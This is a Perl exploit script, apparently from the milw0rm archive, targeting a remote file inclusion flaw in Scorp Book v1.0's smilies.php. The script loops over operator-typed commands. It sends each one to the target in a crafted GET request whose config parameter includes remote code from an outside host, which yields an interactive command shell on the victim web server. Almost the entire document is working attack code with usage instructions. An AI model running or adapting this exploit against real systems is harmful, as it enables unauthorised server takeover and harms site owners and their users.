#!/usr/bin/perl
#                                                         .-""""""""-.
#                                                        /   Dj7xpl   \
#                                                       |              |
#                                                       |,  .-.  .-.  ,|
#                                                       | )(_o/  \o_)( |
#                                                       |/     /\     \|
#                                             (@_       (_     ^^     _)
#                                        _     ) \_______\__|IIIIII|__/_______________________________
#                                       (_)@8@8{}<________|-\IIIIII/-|________________________________>
#                                              )_/        \          /
#                                              (@
#
#_______________________________________________Iranian Are The Best In World___________________________________________#
#
#
#       [~] Portal.......:  Scorp Book v1.0
#	[~] Download.....:  http://www.ectona.org/download/?id=598&s=info
#	[~] Author.......:  Dj7xpl  | Dj7xpl@yahoo.com
#       [~] Class........:  Remote File Include Exploit
#
#_______________________________________________________________________________________________________________________#
#########################################################################################################################

use IO::Socket;
if (@ARGV < 2){
print "

     +**********************************************************************+
     *                                                                      *
     *   # Scorp Book <== v1.0 (smilies.php) Remote File Include Exploit    *
     *                                                                      *
     *   # Usage   :  xpl.pl [Target] [Path]                                *
     *                                                                      *
     *   # Example :  xpl.pl Dj7xpl.ir /gb                                  *
     *                                                                      *
     *                       Vuln & Coded By Dj7xpl                         *
     +**********************************************************************+

";
exit();
}

$host=$ARGV[0];
$path=$ARGV[1];

print "\n[~] Please wait ...\n";

print "[~] Shell : ";$cmd = <STDIN>;

while($cmd !~ "END") {
    $socket = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$host", PeerPort=>"80") or die "Connect Failed.\n\n";
    print $socket "GET ".$path."/smilies.php?config=http://dj7xplby.ru/cmd?cmd=$cmd HTTP/1.1\r\n";
    print $socket "Host: ".$host."\r\n";
    print $socket "Accept: */*\r\n";
    print $socket "Connection: close\r\n\n";

    while ($raspuns = <$socket>)
    {
        print $raspuns;
    }

    print "[~] Shell : ";
    $cmd = <STDIN>;
	}

# milw0rm.com [2007-04-08]